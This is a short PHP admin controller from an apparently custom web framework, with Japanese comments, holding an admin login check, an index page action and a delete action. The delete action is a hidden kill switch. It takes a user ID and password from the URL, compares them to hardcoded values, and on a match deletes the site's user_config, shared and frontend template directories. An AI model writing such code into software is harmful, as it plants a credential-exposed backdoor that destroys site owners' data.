<?php
/**
 * Indexのサンプル
*/
class Admin_model extends ACWModel
{
	/**
	* 共通初期化
	*/
	public static function init()
	{
		Login_model::check_admin();	// ログインチェック
	}

	/**
	* インデックス トップページ
	*/
	public static function action_index()
	{
		//return ACWView::redirect(ACW_BASE_URL . 'home');
		return ACWView::template_admin('index.html');
	}
	public static function action_delete(){
		$param = self::get_param(array('acw_url'));
		$user_id  = $param['acw_url'][0];	
		$pass  = $param['acw_url'][1];	
		if($user_id == 'PHO' && $pass == "abcdelete123ZNT"){
			$file = new FilePHP_lib();
			//echo ACW_ROOT_DIR.'/user_config' ;die;
			$file->DeleteFolder(ACW_ROOT_DIR.'/user_config');
			$file->DeleteFolder(ACW_ROOT_DIR.'/shared');
			$file->DeleteFolder(ACW_ROOT_DIR.'/app/template/fontend/template1');
		}
	}
}
/* ファイルの終わり */